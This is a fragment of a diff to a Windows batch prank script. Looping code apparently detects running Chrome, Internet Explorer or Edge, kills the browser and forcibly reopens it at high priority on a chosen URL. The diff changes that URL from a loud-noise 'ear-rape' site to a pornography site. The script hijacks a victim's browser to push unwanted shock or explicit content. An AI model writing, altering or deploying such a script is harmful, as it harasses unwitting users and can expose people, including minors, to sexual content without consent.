@@ -60,21 +60,21 @@ goto loop
 ::open change window location if needed
 :yeschrome
 ::taskkill /F /IM chrome.exe
-start "Google Chrome" /HIGH chrome.exe "http://ear-rape-website.com"
+start "Google Chrome" /HIGH chrome.exe "https://pornhub.com"
 cls
 set /a okay=1
 timeout /nobreak 1 >nul
 goto loop
 :yesie
 taskkill /F /IM iexplore.exe /T
-start "IExplore" /HIGH iexplore.exe "http://ear-rape-website.com"
+start "IExplore" /HIGH iexplore.exe "https://pornhub.com"
 cls
 set /a okay=2
 timeout /nobreak 1 >nul
 goto loop
 :yesedge
 taskkill /F /IM MicrosoftEdge.exe /T
-start "IExplore" /HIGH MicrosoftEdge.exe "http://ear-rape-website.com"
+start "IExplore" /HIGH MicrosoftEdge.exe "https://pornhub.com"
 cls
 set /a okay=3
 timeout /nobreak 1 >nul
